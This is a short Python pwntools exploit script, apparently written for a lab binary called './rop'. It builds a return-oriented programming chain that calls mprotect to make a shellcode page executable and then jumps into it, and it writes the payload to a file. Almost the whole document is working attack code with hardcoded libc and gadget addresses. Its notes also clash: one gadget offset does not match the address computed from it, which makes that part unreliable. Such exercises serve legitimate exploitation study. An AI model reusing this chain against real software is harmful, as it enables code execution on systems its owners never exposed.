from pwn import *

context.arch = 'amd64'
elf = ELF("./rop")
rop = ROP(elf)
p = elf.process()

'''NOTES

main:           0x555555555149
shellcode:      0x555555558020
libc:           0x00007ffff7e00000
mprotect:       0x00007ffff7ef8c20

MPROTECT SINTAX
                    %RDI        %RSI        %RDX
       int mprotect(void *addr, size_t len, int prot);

addr = shellcode    //Shellcode address
len = 0x1000        //Page Size 4KB
prot = 0x07         //PROT_READ + PROT_WRITE + PROT_EXEC = 0x7

GADGETS OFFSET                  GADGETS ADDRESS
0x00135839: popq %rsi; retq;   ->  0x00007ffff7e00000 + 0x00135839 = 7ffff7f35839
0x0016d275: popq %rdi; retq;   ->  0x00007ffff7e00000 + 0x0016d275 = 7ffff7f6d275
0x00142c92: popq %rdx; retq;   ->  0x00007ffff7e00000 + 0x000ff76d = 7ffff7eff76d
'''


# 1ST STAGE
#OBTENEMOS EL OFFSET DE EL SHELLCODE Y EL MAIN
main = (elf.symbols["main"])
shellcode_sym = (elf.symbols["shellcode"])

print(hex(shellcode_sym))
print(hex(main))

shellcode = 0x555555558020
shellcode_aligned = shellcode&~0xfff
print(hex(shellcode_aligned))

# GADGETS
pop_rdi_ret = p64(0x00007ffff7f6d275)
pop_rsi_ret = p64(0x00007ffff7f35839)
pop_rdx_ret = p64(0x00007ffff7eff76d)
mprotect =    p64(0x00007ffff7ef8c20)

# PAYLOAD
payload = pop_rdi_ret + p64(shellcode_aligned)
payload += pop_rsi_ret + p64(0x1000)
payload += pop_rdx_ret + p64(0x7)
payload += mprotect
payload += p64(shellcode)

f = open('shellcode_exploit.txt', 'wb')
f.write(payload)
print(payload)
